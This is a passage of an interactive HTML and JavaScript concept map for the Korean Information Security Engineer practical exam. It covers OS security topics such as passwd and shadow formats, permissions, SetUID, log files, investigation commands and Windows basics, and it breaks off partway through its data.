<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
<title>실기 개념 지도</title>
<meta name="claude:viewport-fit-sides" content="cover">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+KR:wght@500;700&family=Noto+Sans+KR:wght@400;500;700&display=swap">
<style>
/* Layout: 가운데 주제 → 갈래 → 묶음 → 개념으로 펼쳐지는 트리형 마인드맵. +N을 누르면 하위가 펼쳐지고, 개념을 누르면 설명 패널이 뜬다 */
:root{
  --bg:#f2ebdf;
  --band:#e9dfcf;
  --node:#faf6ee;
  --fg:#3a3027;
  --muted:#7b6c5b;
  --line:#c9b9a2;
  --accent:#86664a;
  --miss:#e0cfb3;
  --font-display:"IBM Plex Sans KR","Noto Sans KR",system-ui,sans-serif;
  --font-body:"Noto Sans KR",system-ui,-apple-system,"Apple SD Gothic Neo",sans-serif;
}
@media (prefers-color-scheme: dark){
  :root:not([data-theme="light"]){
    --bg:#211c17;--band:#2a241e;--node:#2f2822;--fg:#e9e0d2;--muted:#a8977f;--line:#4d4238;--accent:#c7a57f;--miss:#4a3d30;color-scheme:dark;
  }
}
:root[data-theme="dark"]{
  --bg:#211c17;--band:#2a241e;--node:#2f2822;--fg:#e9e0d2;--muted:#a8977f;--line:#4d4238;--accent:#c7a57f;--miss:#4a3d30;color-scheme:dark;
}
*{box-sizing:border-box}
body{
  background:var(--bg);color:var(--fg);font-family:var(--font-body);font-size:15px;line-height:1.7;
  padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));
  padding-block:28px 48px;
}
.wrap{max-width:1400px;margin:0 auto;display:flex;flex-direction:column;gap:18px}
header{display:flex;flex-direction:column;gap:4px}
.eyebrow{font-size:12px;letter-spacing:.08em;color:var(--muted)}
h1{font-family:var(--font-display);font-weight:700;font-size:clamp(24px,3.6vw,32px);line-height:1.2;margin:0}
.lede{margin:0;color:var(--muted);font-size:14px}
.tools{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
.tools button{
  font:inherit;font-size:13px;color:var(--fg);background:transparent;border:1px solid var(--line);
  border-radius:999px;padding:4px 13px;cursor:pointer;line-height:1.6;
}
.tools button[aria-pressed="true"]{background:var(--fg);color:var(--bg);border-color:var(--fg)}
.tools .sp{flex:1}
button:focus-visible,.node:focus-visible{outline:2px solid var(--accent);outline-offset:2px}

.mapbox{cursor:grab;user-select:none;background:var(--band);border-radius:12px;overflow:auto;-webkit-overflow-scrolling:touch;max-height:calc(100vh - 170px);min-height:340px}
.mapbox.dragging{cursor:grabbing}
#map{display:block}
#map text{font-family:var(--font-body);fill:var(--fg);pointer-events:none}
#map text .badge{fill:var(--muted);font-weight:500}
.edge{fill:none;stroke:var(--line);stroke-width:1.4;transition:opacity .2s}
.xlink{fill:none;stroke:var(--accent);stroke-width:1.4;stroke-dasharray:4 4}
.node{cursor:pointer;transition:opacity .2s}
.node rect{fill:var(--node);stroke:var(--line);stroke-width:1}
.node:hover rect{stroke:var(--accent)}
.node.hub rect{fill:var(--bg);stroke:var(--fg);stroke-width:1.3}
.node.hub text{font-family:var(--font-display);font-weight:700}
.node.group rect{fill:var(--bg);stroke:var(--muted)}
.node.center rect{fill:var(--fg);stroke:var(--fg)}
#map .node.center text{fill:var(--bg);font-family:var(--font-display);font-weight:700}
body.show-miss .node.miss rect{fill:var(--miss);stroke:var(--accent)}
#map.focus .node:not(.on),#map.focus .edge:not(.on){opacity:.22}
.node.sel rect{stroke:var(--accent);stroke-width:2.4}
.node.rel rect{stroke:var(--accent);stroke-width:1.6}

.panel{
  position:fixed;z-index:5;right:max(20px,env(safe-area-inset-right,0px));bottom:max(20px,env(safe-area-inset-bottom,0px));
  width:min(380px,calc(100vw - 32px));max-height:min(60vh,520px);overflow:auto;
  background:var(--node);color:var(--fg);border:1px solid var(--line);border-radius:12px;
  box-shadow:0 10px 30px rgba(40,30,20,.16);padding:16px 18px 18px;
}
.panel .top{display:flex;align-items:flex-start;gap:10px}
.panel .where{font-size:12px;color:var(--muted);letter-spacing:.02em}
.panel h2{font-family:var(--font-display);font-size:19px;margin:2px 0 0;line-height:1.35}
.panel .x{margin-left:auto;font:inherit;font-size:20px;line-height:1;background:transparent;border:0;color:var(--muted);cursor:pointer;padding:2px 4px}
.panel ul{margin:12px 0 0;padding-left:18px;display:flex;flex-direction:column;gap:6px;font-size:14px}
.panel .rel-title{margin:14px 0 6px;font-size:12px;color:var(--muted)}
.panel .chips{display:flex;flex-wrap:wrap;gap:6px}
.panel .chips button{font:inherit;font-size:13px;background:transparent;color:var(--accent);border:1px solid var(--line);border-radius:999px;padding:2px 11px;cursor:pointer}
.panel .chips button:hover{border-color:var(--accent)}
@media (max-width:640px){
  .panel{left:max(16px,env(safe-area-inset-left,0px));right:max(16px,env(safe-area-inset-right,0px));width:auto;bottom:max(12px,env(safe-area-inset-bottom,0px));max-height:48vh}
}
footer{font-size:12.5px;color:var(--muted)}
.tabs{display:flex;gap:4px;border-bottom:1px solid var(--line)}
.tabs button{font:inherit;font-size:15px;font-weight:700;font-family:var(--font-display);color:var(--muted);background:transparent;border:0;border-bottom:2px solid transparent;padding:8px 14px;margin-bottom:-1px;cursor:pointer}
.tabs button[aria-selected="true"]{color:var(--fg);border-bottom-color:var(--fg)}
.view{display:flex;flex-direction:column;gap:18px}
.view[hidden]{display:none!important}
.qbar{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
.qbar select{font:inherit;font-size:13px;color:var(--fg);background:var(--node);border:1px solid var(--line);border-radius:999px;padding:4px 10px;max-width:100%}
.qbar button{font:inherit;font-size:13px;color:var(--fg);background:transparent;border:1px solid var(--line);border-radius:999px;padding:4px 13px;cursor:pointer;line-height:1.6}
.qbar button[aria-pressed="true"]{background:var(--fg);color:var(--bg);border-color:var(--fg)}
.qstat{font-size:13px;color:var(--muted);margin-left:auto}
.cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:12px}
.card{background:var(--node);border:1px solid var(--line);border-radius:12px;padding:14px 16px;display:flex;flex-direction:column;gap:8px}
.card.miss{border-color:var(--accent);box-shadow:inset 3px 0 0 var(--accent)}
.card .path{font-size:12px;color:var(--muted)}
.card .clue{font-size:15px;line-height:1.65}
.card .ans{border-top:1px dashed var(--line);padding-top:8px}
.card .ans b{font-family:var(--font-display);font-size:16px;display:block}
.card .ans ul{margin:6px 0 0;padding-left:18px;font-size:13.5px;color:var(--fg);display:flex;flex-direction:column;gap:3px}
.card .act{display:flex;gap:6px;flex-wrap:wrap}
.card .act button{font:inherit;font-size:13px;background:transparent;color:var(--fg);border:1px solid var(--line);border-radius:999px;padding:3px 12px;cursor:pointer}
.card .act button.reveal{border-color:var(--fg)}
.card .act button.on{background:var(--fg);color:var(--bg);border-color:var(--fg)}
.empty{color:var(--muted);font-size:14px;padding:24px 0}

.outline{display:flex;flex-direction:column;gap:30px}
.subj{display:flex;flex-direction:column;gap:12px}
.subj>h2{font-family:var(--font-display);font-size:20px;margin:0}
.chaps{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:12px;align-items:start}
.chap{background:var(--node);border:1px solid var(--line);border-radius:12px;padding:14px 16px;min-width:0}
.chap h3{font-family:var(--font-display);font-size:15.5px;margin:0 0 6px}
.chap .none{color:var(--muted);font-size:13.5px}
ul.tree{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:2px}
ul.tree ul.tree{padding-left:14px;margin:2px 0 4px 5px;border-left:1px solid var(--line)}
.tree .lbl{font:inherit;font-size:14px;line-height:1.55;color:var(--fg);background:none;border:0;padding:2px 0;text-align:left;cursor:pointer;display:inline-flex;gap:6px;align-items:baseline}
.tree .lbl.grp{font-weight:700}
.tree .lbl:hover{color:var(--accent)}
.tree .lbl .dot{width:6px;height:6px;border-radius:50%;background:var(--accent);flex:none;transform:translateY(-1px)}
.tree .desc{margin:2px 0 6px;padding-left:16px;font-size:13px;color:var(--muted);display:flex;flex-direction:column;gap:2px}
.tree .desc[hidden]{display:none!important}
</style>

<div class="wrap">
  <header>
    <span class="eyebrow">정보보안기사 실기 · 과목 → 교재 장 → 개념 · 풀면서 채우는 지도</span>
    <h1>실기 개념 지도</h1>
    <p class="lede">+숫자가 붙은 항목을 누르면 하위 개념이 펼쳐진다. 개념을 누르면 설명이 뜨고, 연결된 개념은 점선으로 이어진다.</p>
  </header>

  <section class="view" id="view-map">
  <div class="tools">
    <button type="button" id="open-all">모두 펼치기</button>
    <button type="button" id="close-all">모두 접기</button>
    <button type="button" id="toggle-miss" aria-pressed="false">헷갈린 개념 표시</button>
    <span class="sp"></span>
    <button type="button" id="zoom-out" aria-label="축소">−</button>
    <button type="button" id="zoom-fit">전체 보기</button>
    <button type="button" id="zoom-in" aria-label="확대">+</button>
  </div>
  <div class="mapbox" id="mapbox">
    <svg id="map" xmlns="http://www.w3.org/2000/svg" role="group" aria-label="개념 지도"></svg>
  </div>
  </section>
  <footer>기출을 풀며 나온 개념을 교재 장 순서로 모았다. 빈 장은 풀면서 채운다.</footer>
</div>

<div class="panel" id="panel" hidden>
  <div class="top">
    <div>
      <div class="where" id="p-where"></div>
      <h2 id="p-title"></h2>
    </div>
    <button type="button" class="x" id="p-close" aria-label="닫기">×</button>
  </div>
  <ul id="p-desc"></ul>
  <div id="p-relwrap">
    <div class="rel-title">연결된 개념</div>
    <div class="chips" id="p-rel"></div>
  </div>
</div>

<script>
(function(){
/* n(id, 이름, 설명[], 하위[], 헷갈림) */
function n(id,label,d,k,m){return {id:id,label:label,d:d,k:k||[],m:m?1:0};}

var TREE=n("center","정보보안기사 실기",["과목 → 교재 장 → 개념 순서로 펼쳐진다.","풀면서 나온 개념을 계속 채운다."],[
 n("s1","1과목 운영체제 보안",["모든 공격과 점검은 결국 운영체제 위에서 일어나기 때문에, 운영체제가 정상일 때 어떻게 생겼는지를 먼저 알아야 무엇이 잘못되었는지 판단할 수 있다.","1과목은 윈도우와 유닉스/리눅스의 정상 구조를 다루는 1장과, 그 구조를 기준으로 설정이 안전한지 점검하는 2장으로 이루어진다."],[
  n("s1c1","1장 정보시스템",["공격과 점검은 모두 운영체제의 정상 구조를 기준으로 하기 때문에, 이 장의 내용이 1과목 전체의 바탕이 된다.","1장은 윈도우와 유닉스/리눅스 운영체제의 정상 구조, 즉 파일, 계정, 권한, 로그가 어떻게 이루어져 있는지를 다룬다."],[
   n("osbase","운영체제 기본",["명령이 어떤 단계를 거쳐 하드웨어까지 전달되는지 알아야 쉘, 커널 같은 용어가 문제에 나왔을 때 각각의 역할을 구분할 수 있다.","운영체제에서 명령은 사용자, 쉘, 커널, 하드웨어 순서로 전달된다."],[
    n("shell","쉘 (Shell)",["사용자가 입력한 명령이 커널에 바로 전달되지는 않기 때문에, 그 사이에서 명령을 해석해 주는 쉘의 역할을 알아 두어야 한다. 28회에 서술형으로 출제되었다.","쉘은 사용자가 입력한 명령어를 읽고 해석해서 커널에 전달하는 프로그램으로, 명령어 해석기라고도 부른다.","쉘의 기능은 세 가지이다. 명령어를 해석하는 명령어 해석기 기능, 제어문과 변수를 써서 스크립트를 작성하는 프로그래밍 기능, 사용자 환경을 설정하는 기능이다."])
   ]),
   n("unixfs","유닉스/리눅스 파일 시스템",["중요한 설정 파일이나 로그가 어디에 있는지 알아야 점검과 침해사고 조사를 할 수 있다.","이 영역은 유닉스/리눅스에서 파일과 디렉터리가 어디에 무엇을 두는지, 그리고 파일 시스템의 복구 기능을 다룬다."],[
    n("dirs","주요 디렉터리 (8회)",["설정 파일, 명령어, 장치 파일이 어느 디렉터리에 있는지 알아야 문제에 나온 경로를 보고 무엇을 점검하는지 이해할 수 있다. 8회에 출제되었다.","/proc는 실행 중인 프로세스와 커널 정보를 담고 있는 가상 디렉터리이다.","/etc에는 passwd, shadow 같은 설정 파일이 있고, /bin에는 기본 명령어가 있다.","/dev에는 장치 파일이 있고, /root는 root 사용자의 홈 디렉터리이다."]),
    n("journal","저널링 (Journaling, 5회)",["작업 도중 전원이 갑자기 꺼지면 파일 시스템이 손상될 수 있기 때문에, 이를 복구할 수 있는 장치가 필요하다. 5회에 출제되었다.","저널링은 명령을 수행하기 전에 로그를 먼저 적어 두고, 시스템이 갑자기 꺼져 손상되면 그 로그를 이용해 복구하는 방식이다.","리눅스는 ext3부터 저널링을 지원하며, 윈도우의 NTFS도 저널링을 지원한다."])
   ]),
   n("account","계정 파일",["사용자가 로그인할 때 시스템이 확인하는 정보가 이 파일들에 들어 있기 때문에, 계정 파일이 노출되거나 조작되면 시스템 전체가 위험해진다.","계정 파일은 /etc/passwd와 /etc/shadow 두 가지이다. passwd는 누구나 읽을 수 있고, shadow는 root만 읽을 수 있다."],[
    n("passwd","/etc/passwd 7필드 (22회)",["어떤 계정이 있고 각 계정이 어떤 UID와 쉘을 쓰는지 확인하려면 /etc/passwd의 필드 순서를 정확히 알아야 한다. 22회에 출제되었다.","/etc/passwd는 7개 필드로 이루어지며, 형식은 `계정명 : 패스워드(x) : UID : GID : 설명 : 홈 디렉터리 : 로그인 쉘`이다.","예를 들면 `soojebi:x:500:1000:Gen-User:/home/soojebi:/bin/bash`와 같다.","패스워드 필드의 x는 실제 비밀번호가 shadow 파일에 저장되어 있다는 뜻이다."],[],1),
    n("shadow","/etc/shadow 8필드 (29회)",["실제 비밀번호와 비밀번호 사용 기간 정책이 이 파일에 들어 있기 때문에, 필드 순서를 알아야 비밀번호 정책이 제대로 적용되었는지 점검할 수 있다. 29회에 출제되었다.","/etc/shadow는 8개 필드로 이루어지며, 형식은 `계정명 : 암호화된 패스워드 : 마지막 변경일 : 최소 사용 기간 : 최대 사용 기간 : 만료 경고 기간 : 비활성화 일수 : 만료일`이다.","패스워드 필드가 비어 있으면 비밀번호 없이 로그인할 수 있고, `*` 또는 `!`이면 계정이 잠긴 상태이다."],[],1),
    n("shadowpw","shadow 암호 칸 구조 (16회)",["shadow 파일의 암호 필드를 보면 어떤 해시 알고리즘을 썼는지, 솔트가 무엇인지 알 수 있기 때문에 그 구조를 읽을 줄 알아야 한다. 16회에 출제되었다.","shadow의 암호 필드는 `$해시ID$솔트$해시값` 형식으로 되어 있다.","해시ID는 `$1`이면 MD5, `$2a`이면 Blowfish, `$5`이면 SHA-256, `$6`이면 SHA-512를 뜻한다.","솔트는 비밀번호에 섞는 난수이다. 솔트를 쓰면 같은 비밀번호라도 해시값이 달라지므로 레인보우 테이블 공격에 강해진다. 이 내용은 14회에 서술형으로 출제되었다."],[],1),
    n("pwconv","pwconv · pwunconv",["비밀번호를 누구나 읽을 수 있는 passwd에 두면 위험하므로, root만 읽을 수 있는 shadow로 옮기거나 되돌리는 방법을 알아야 한다.","`pwconv`는 passwd에 있던 비밀번호를 shadow로 옮겨 shadow 파일을 사용하게 하는 명령이다.","`pwunconv`는 shadow를 해제하고 비밀번호를 다시 passwd에 두는 명령으로, shadow를 비활성화한다."])
   ]),
   n("pam","PAM 타입 (23회)",["인증 방식을 바꿀 때마다 프로그램을 고치지 않고 설정만으로 바꿀 수 있어야 하기 때문에, 리눅스는 PAM으로 인증을 관리한다. 23회에 출제되었다.","PAM(Pluggable Authentication Module)은 인증 방법을 모듈 형태로 끼워 쓰는 구조이다.","PAM 타입은 네 가지이다. auth는 비밀번호를 확인하고, account는 접근 허용 여부를 판단하며, password는 비밀번호 변경을 처리하고, session은 로그인 후 세션을 관리한다."],[],1),
   n("perm","권한",["파일에 권한이 잘못 주어지면 다른 사용자가 중요 파일을 읽거나 바꿀 수 있기 때문에, 권한 구조를 이해하는 것이 점검의 출발점이다.","권한은 누가(소유자, 그룹, 기타) 무엇을(읽기, 쓰기, 실행) 할 수 있는지를 정한 것이다."],[
    n("rwx","기본 권한 rwx",["권한을 숫자로 바꾸거나 숫자를 권한 문자열로 읽는 문제가 자주 나오기 때문에 변환 방법을 익혀 두어야 한다.","권한 값은 r=4, w=2, x=1이며, 소유자, 그룹, 기타 순서로 표기한다.","예를 들어 `-rwxr-x--x`는 751이며, 소유자는 rwx, 그룹은 r-x, 기타는 --x 권한을 가진다. 이 내용은 27회에 서술형으로 출제되었다."]),
    n("umask","umask · chown · chmod",["새로 만들어지는 파일의 기본 권한이 너무 느슨하면 다른 사용자가 읽을 수 있기 때문에, 기본 권한과 소유자·권한 변경 명령을 알아 두어야 한다.","umask는 새 파일의 기본 권한을 정하는 값이다. 파일은 666, 디렉터리는 777에서 umask를 뺀 값이 기본 권한이 되며, umask가 022이면 파일 권한은 644가 된다.","백업 파일을 600 권한으로 만들려면 umask를 066으로 설정하면 된다. 이 내용은 15회에 서술형으로 출제되었다.","`chown`은 소유자를 바꾸는 명령이고, `chmod`는 권한을 바꾸는 명령이다(예: `chmod 700 파일`)."]),
    n("special","특수 권한 (SetUID · SetGID · Sticky)",["특수 권한은 일반 사용자가 일시적으로 더 높은 권한을 얻게 해 주기 때문에, 잘못 설정되면 권한 상승 공격의 통로가 된다.","SetUID(4000)가 설정된 파일은 실행하면 파일 소유자의 권한으로 실행된다. 소유자 실행 자리에 s로 표시되며, 실행 권한이 없으면 S로 표시된다. 대표적인 예가 passwd 명령이다.","SetGID(2000)가 설정된 파일은 파일 소유 그룹의 권한으로 실행되며, 그룹 실행 자리에 s로 표시된다.","Sticky Bit(1000)가 설정된 디렉터리에는 누구나 파일을 만들 수 있지만, 자기 파일만 지울 수 있다. 기타 실행 자리에 t로 표시되며, 대표적인 예가 /tmp(`drwxrwxrwt`)이다."],[],1),
    n("uid3","RUID · EUID · SUID (8회)",["SetUID 프로그램을 실행할 때 어떤 ID로 권한이 판단되는지 알아야 권한 상승이 어떻게 일어나는지 이해할 수 있다. 8회에 출제되었다.","RUID는 실제로 프로그램을 실행한 사용자의 ID이다.","EUID는 권한을 판단할 때 쓰는 ID로, SetUID 파일을 실행하면 파일 소유자의 ID가 된다.","SUID는 원래 값으로 되돌리기 위해 저장해 둔 ID이다.","UID가 500인 사용자가 root 소유의 4755 권한 파일을 실행하면 RUID, EUID, SUID는 각각 500, 0, 0이 된다. 이 상태에서 EUID가 0일 때 `setuid(600)`을 호출하면 세 값이 모두 600이 된다."],[],1)
   ]),
   n("xinetd","xinetd 설정 (9회·24회 서술)",["여러 네트워크 서비스를 하나의 데몬이 관리하므로, 그 설정만 잘 해도 서비스 접근을 한곳에서 통제할 수 있다. 9회와 24회에 서술형으로 출제되었다.","xinetd는 슈퍼 데몬으로, `/etc/xinetd.d/서비스` 파일로 각 서비스의 접근을 통제한다.","only_from은 허용할 대역, no_access는 차단할 대역, instances는 동시에 실행할 서버 수, per_source는 같은 IP에서의 최대 연결 수를 지정한다.","cps는 초당 연결 수와 초과 시 정지 시간을 지정하고, access_times는 접속을 허용할 시간을 지정한다.","socket_type은 stream이면 TCP, dgram이면 UDP이다. wait가 no이면 바로 다음 요청을 처리하고, disable이 no이면 서비스가 실행된다."]),
   n("unixcmd","점검·분석 명령어",["침해사고가 일어나면 어떤 프로세스와 파일이 이상한지 직접 확인해야 하기 때문에, 조사에 쓰는 명령어를 알아 두어야 한다.","이 영역은 strace, lsof, find, chattr·lsattr, crontab처럼 침해사고 조사와 점검에 쓰는 명령을 다룬다."],[
    n("strace","strace (16회)",["공격자가 ps 같은 기본 명령을 조작해 두었는지 확인하려면 그 명령이 실제로 무엇을 하는지 추적해야 한다. 16회에 출제되었다.","strace는 프로세스가 호출하는 시스템 호출을 추적하는 명령이다.","`strace -e trace=open ps`를 실행하면 ps가 여는 파일을 확인할 수 있어, 조작된 ps를 탐지할 수 있다.","`-p` 옵션은 PID를 지정해 추적하고, `-o` 옵션은 결과를 파일로 저장한다."]),
    n("lsof","lsof (28회)",["수상한 프로세스가 어떤 파일이나 포트를 열고 있는지 알아야 악성 행위를 찾을 수 있다. 28회에 출제되었다.","lsof(List Open Files)는 열려 있는 파일과 그 파일을 사용하는 프로세스를 확인하는 명령이다.","`-i` 옵션은 포트를, `-u` 옵션은 사용자를, `+D` 옵션은 디렉터리를 기준으로 조회한다."],[],1),
    n("find","find",["최근에 바뀐 파일이나 위험한 권한이 붙은 파일을 찾아내는 일은 침해사고 조사와 취약점 점검에서 가장 기본이 되는 작업이다.","`-mtime -N` 옵션은 N일 이내에 수정된 파일을 찾는다. 이 내용은 1회와 11회에 서술형으로 출제되었다.","`-user root -perm -4000` 옵션을 함께 쓰면 root 소유의 SetUID 파일을 찾을 수 있다.","`-type` 옵션은 파일 종류를 지정하며, f는 일반 파일, d는 디렉터리, l은 심볼릭 링크이다."]),
    n("chattr","chattr · lsattr (12회 서술)",["중요한 파일을 root라도 실수나 공격으로 바꾸거나 지우지 못하게 막아야 할 때가 있다. 12회에 서술형으로 출제되었다.","`chattr +i 파일`을 실행하면 그 파일에 변경과 삭제를 할 수 없는 속성이 추가된다.","`lsattr`는 파일에 설정된 속성을 확인하는 명령이다."]),
    n("cron","crontab",["정해진 시간에 자동으로 실행되는 작업은 공격자가 악성 명령을 숨겨 두기 좋은 곳이기 때문에, crontab 형식을 읽고 점검할 줄 알아야 한다.","crontab의 필드 순서는 `분 시 일 월 요일 명령`이다. 예를 들어 `0 3 * * 0`은 매주 일요일 3시에 실행된다는 뜻이다.","`-l` 옵션은 목록 보기, `-e`는 편집, `-r`은 삭제, `-u`는 사용자 지정에 쓴다.","root의 cron 작업이 /tmp에 있는 파일을 /etc/passwd로 복사하도록 되어 있으면, 누구나 /tmp 파일을 바꾸어 passwd를 바꿀 수 있다. 이 내용은 7회에 서술형으로 출제되었다."])
   ]),
   n("unixlog","유닉스/리눅스 로그",["침해사고가 나면 누가 언제 들어왔고 무엇을 했는지를 로그로 확인해야 하기 때문에, 각 로그 파일의 역할을 알아야 한다.","유닉스/리눅스 로그는 로그 파일과 그 내용을 확인하는 명령을 짝으로 외워 두는 것이 좋다."],[
    n("logcommon","공통 (유닉스·리눅스)",["유닉스와 리눅스 어디서나 쓰이는 로그를 먼저 묶어 두면, 운영체제별 차이만 따로 외우면 되어 부담이 줄어든다.","접속 기록(utmp·wtmp·lastlog), 실행 명령 기록(acct/pacct), FTP 전송 기록(xferlog)이 여기에 속한다."],[
     n("utmp","utmp",["지금 이 순간 시스템에 누가 접속해 있는지 확인해야 할 때 utmp를 본다.","utmp는 현재 로그인한 사용자의 상태를 기록하는 바이너리 파일이며, `w`, `who`, `finger` 명령으로 확인한다."],[],1),
     n("wtmp","wtmp",["과거에 누가 언제 로그인했는지, 시스템이 언제 재부팅되었는지 확인하려면 wtmp를 봐야 한다.","wtmp는 성공한 로그인과 로그아웃, 부팅과 셧다운 기록을 담고 있으며, `last` 명령으로 확인한다."],[],1),
     n("lastlog","lastlog",["사용자별로 마지막 접속이 언제, 어디서였는지 보면 평소와 다른 접속을 찾을 수 있다.","lastlog는 사용자별로 가장 최근 로그인 시간과 접속한 호스트를 기록하며, `lastlog` 명령으로 확인한다."],[],1),
     n("pacct","acct/pacct",["공격자가 접속해서 어떤 명령을 실행했는지 알아야 피해 범위를 파악할 수 있다.","acct/pacct는 사용자가 로그아웃할 때까지 입력한 명령어를 기록하며, `lastcomm`이나 `acctcom` 명령으로 확인한다."],[],1),
     n("xferlog","xferlog",["FTP로 어떤 파일이 들어오고 나갔는지 알아야 자료 유출이나 악성 파일 업로드를 확인할 수 있다.","xferlog는 FTP 접속 기록과 업로드·다운로드한 파일을 기록하는 로그이다."])
    ]),
    n("logunix","유닉스",["유닉스(솔라리스 등)에만 있는 로그는 이름이 리눅스와 달라서 시험에서 운영체제를 구별해 묻는 경우가 많다.","유닉스는 su 권한 변경 기록(sulog)과 연속 로그인 실패 기록(loginlog)을 따로 남긴다."],[
     n("sulog","sulog (유닉스)",["일반 사용자가 su로 root 권한을 얻으려 한 기록은 권한 상승 시도를 추적하는 중요한 단서이다.","sulog는 유닉스에서 su 명령으로 권한을 바꾼 기록이다. 성공은 +, 실패는 -로 표시되며, 어느 사용자(from)에서 어느 사용자(to)로 바꾸었는지가 남는다."],[],1),
     n("loginlog","loginlog (유닉스)",["로그인을 여러 번 연달아 실패했다면 비밀번호 추측 공격일 가능성이 있으므로 따로 기록해 둔다.","loginlog는 유닉스에서 로그인에 5회 이상 실패한 기록을 남기는 파일이다."],[],1)
    ]),
    n("loglinux","리눅스",["리눅스는 로그가 /var/log 아래에 모이고, 유닉스와 다른 이름의 파일을 쓰기 때문에 따로 정리해 두어야 한다.","로그인 실패 기록(btmp), 시스템 주요 메시지(/var/log/messages), 로그 순환 도구(logrotate)가 여기에 속한다."],[
     n("btmp","btmp (리눅스)",["로그인 실패가 많이 쌓여 있으면 무차별 대입 공격을 의심할 수 있기 때문에 실패 기록을 볼 줄 알아야 한다.","btmp는 리눅스에서 실패한 로그인 시도를 모두 기록하는 파일이며, `lastb` 명령으로 확인한다."],[],1),
     n("messages","/var/log/messages 형식 (23회)",["/var/log/messages는 시스템의 주요 메시지가 모이는 로그이기 때문에, 로그 한 줄을 보고 각 부분이 무엇인지 읽을 줄 알아야 한다. 23회에 출제되었다.","/var/log/messages의 형식은 `날짜 시간 / 호스트명 / 프로세스[PID]: / 메시지` 순서이다.","예를 들면 `Jan 01 12:00:00 soojebi systemd[1]: Started OpenSSH server daemon.`과 같다."],[],1),
     n("logrotate","logrotate (12회)",["로그를 그대로 두면 계속 커져서 디스크를 채우기 때문에, 일정 기준으로 나누고 오래된 것을 정리해야 한다. 12회에 출제되었다.","logrotate는 로그 파일을 순환 관리하는 도구이며, 설정 파일은 /etc/logrotate.conf이다.","weekly는 주 단위로 순환하고, `rotate 4`는 4개를 보관하며, create는 새 빈 로그 파일을 만들고, compress는 압축하고, `size 1M`은 크기 1M를 기준으로 순환하라는 뜻이다."])
    ])
   ]),
   n("win","윈도우",["윈도우 시스템을 점검하거나 침해사고를 조사하려면 실행 파일, 계정, 파일 시스템, 로그가 정상일 때 어떤 모습인지 알아야 한다.","이 영역은 윈도우의 실행 파일 구조, 계정 그룹, 파일 시스템, 로그 위치, 관리 명령을 다룬다."],[
    n("ntfs","NTFS (29회)",["파일마다 누가 접근할 수 있는지 정하고 장애 후 복구하는 기능은 파일 시스템이 제공하기 때문에, 윈도우의 기본 파일 시스템인 NTFS의 특징을 알아야 한다. 29회에 출제되었다.","NTFS(New Technology File System)는 윈도우 NT 계열의 파일 시스템이다.","NTFS는 접근 제어(권한) 같은 보안 기능과 저널링 같은 복구 기능을 함께 제공한다."]),
    n("bitlocker","BitLocker (11회)",["노트북이나 디스크를 잃어버려도 안의 데이터를 읽지 못하게 하려면 저장 장치 자체를 암호화해야 하기 때문에, 윈도우의 암호화 기능을 구분해 알아 두어야 한다. 11회에 출제되었다.","BitLocker는 Windows Vista 이상에서 제공하는 기능으로, 볼륨(드라이브) 단위로 전체를 암호화한다.","다만 부팅에 필요한 시스템 파티션은 암호화 대상에서 제외된다.","EFS는 파일·폴더 단위로 암호화하는 기능이므로 BitLocker와 구분해야 한다."]),
    n("pe","PE 포맷 섹션 (7회)",["악성코드 분석에서는 실행 파일의 어느 부분에 코드와 데이터가 들어 있는지 알아야 하기 때문에 PE 포맷의 섹션 구성을 알아 두어야 한다. 7회에 출제되었다.","PE 포맷은 윈도우 실행 파일(.exe, .dll)의 구조이며, 섹션마다 담는 내용이 다르다.",".text 섹션에는 실행 코드가, .data 섹션에는 초기화된 전역·정적 변수가 들어 있다.",".rdata 섹션에는 상수와 문자열이, .bss 섹션에는 초기화되지 않은 전역 변수가 들어 있다.",".idata 섹션에는 불러오는(Import) DLL과 API 목록이, .edata 섹션에는 내보내는(Export) 함수가 들어 있다.",".rsrc 섹션에는 아이콘 같은 리소스가, .reloc 섹션에는 재배치 정보가 들어 있다."]),
    n("wingroup","윈도우 기본 그룹 (25회)",["어떤 그룹에 속하느냐에 따라 사용자가 할 수 있는 일이 정해지기 때문에, 권한이 지나치게 큰 그룹에 사용자가 들어가 있지 않은지 점검하려면 기본 그룹의 역할을 알아야 한다. 25회에 출제되었다.","Administrators 그룹은 모든 권한을 가진다.","Power Users 그룹은 공유를 만들고, 공용 프로그램 그룹을 만들고, 표준 시간을 변경할 수 있다.","Backup Operators 그룹은 백업을 위해 모든 파일과 디렉터리에 접근할 수 있다.","Users 그룹은 일반 사용자로, 시스템 설정 변경이 제한된다. Guests 그룹은 제한된 범위에서 임시로 사용하는 그룹이다.","Account Operators 그룹은 계정을 관리하고, Server Operators 그룹은 서버를 관리하며, Print Operators 그룹은 프린터를 관리한다."]),
    n("uac","UAC (사용자 계정 컨트롤)",["프로그램이 처음부터 관리자 권한으로 실행되면 악성 프로그램도 시스템을 마음대로 바꿀 수 있기 때문에, 권한 상승을 사용자가 직접 확인하게 하는 장치가 필요하다. 26회에 서술형으로 출제되었다.","UAC(사용자 계정 컨트롤)는 프로그램을 기본적으로 일반 권한으로 실행하고, 관리자 권한이 필요할 때 확인 창을 띄우는 기능이다.","확인 창에서 [예] 버튼이 비활성화되는 경우는 관리자 계정이 비활성화되거나 삭제된 경우, 그리고 시스템 파일이 손상된 경우이다."]),
